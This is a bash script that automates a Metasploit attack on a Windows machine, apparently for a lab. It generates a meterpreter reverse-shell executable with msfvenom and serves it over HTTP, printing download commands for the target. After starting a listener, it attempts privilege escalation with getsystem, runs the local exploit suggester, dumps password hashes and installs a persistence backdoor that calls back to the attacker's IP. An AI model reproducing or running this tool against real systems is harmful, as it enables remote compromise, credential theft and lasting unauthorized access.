#!/bin/bash
echo" "
echo "Closing previous if you have one..."
pkill -f "python3 -m http.server 8080"
echo " "
echo "[+] Complete!"
echo " "

#Configure your Kali IP and Port
read -p "Enter attacker IP: " KALI_IP
read -p "Enter the port you want to use (example: 4444): " LPORT
read -p "Enter the name of the executable you want to create (example: test.exe): " SNAME

# Kill any process using the port
echo "[+] Checking for processes using port $LPORT..."
PID=$(lsof -t -i :$LPORT)  # Get the PID of the process using the port

# If a process is found, kill it
if [ ! -z "$PID" ]; then
  echo "[+] Found process with PID $PID using port $LPORT. Killing it..."
  kill -9 $PID
else
  echo "[+] No process found using port $LPORT."
fi


# Generate the Payload
echo "[+] Generating Windows Reverse Shell Payload..."
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$KALI_IP LPORT=$LPORT -f exe > $SNAME
echo " "
# Start Python HTTP Server
echo "[+] Starting Python HTTP Server..."
python3 -m http.server 8080 &
echo " "
echo "[+] Serve the payload to the Windows VM:"
echo "Run this in Windows CMD or PowerShell:"
echo "curl http://$KALI_IP:8080/$SNAME -o $SNAME"
echo "OR"
echo "powershell -Command \"Invoke-WebRequest -Uri 'http://$KALI_IP:8080/$SNAME' -OutFile '$SNAME'\""
echo " "
# Start Metasploit and Set Up Listener
echo "[+] Starting Metasploit..."
msfconsole -q -x "
use exploit/multi/handler;
set payload windows/meterpreter/reverse_tcp;
set LHOST $KALI_IP;
set LPORT $LPORT;
set ExitOnSession false;
exploit -j
"
echo " "
echo "[+] Waiting for connection..."
sleep 10
echo " "
# Check if a session exists before running further commands
echo "[+] Checking if a session is active..."
SESSION_ID=$(msfconsole -q -x "sessions -l" | grep meterpreter | awk '{print $1}')

if [[ -z "$SESSION_ID" ]]; then
    echo "[!] No active session found. Waiting for a connection..."
else
    echo "[+] Connected to session $SESSION_ID!"

    # Run System Info
    echo "[+] Gathering system info..."
    msfconsole -q -x "
    sessions -i $SESSION_ID;
    sysinfo;
    getuid;
    "

    # Try Privilege Escalation with 'getsystem'
    echo "[+] Checking for privilege escalation..."
    msfconsole -q -x "
    sessions -i $SESSION_ID;
    getsystem;
    "

    # Run Local Exploit Suggester
    echo "[+] Running Local Exploit Suggester..."
    msfconsole -q -x "
    use post/multi/recon/local_exploit_suggester;
    set SESSION $SESSION_ID;
    run;
    "

    # If Admin, Dump Password Hashes
    echo "[+] Checking if we have SYSTEM privileges..."
    USER_ID=$(msfconsole -q -x "sessions -i $SESSION_ID; getuid;" | grep "NT AUTHORITY\\SYSTEM")

    if [[ ! -z "$USER_ID" ]]; then
        echo "[+] SYSTEM access confirmed! Dumping password hashes..."
        msfconsole -q -x "
        sessions -i $SESSION_ID;
        hashdump;
        "
    fi

    # Auto-Create Persistence (Backdoor)
    echo "[+] Setting up persistence..."
    msfconsole -q -x "
    sessions -i $SESSION_ID;
    run persistence -U -i 10 -p $LPORT -r $KALI_IP;
    "

    echo "[+] All tasks completed! Keeping Metasploit open..."
fi

# Keep Metasploit session open
msfconsole
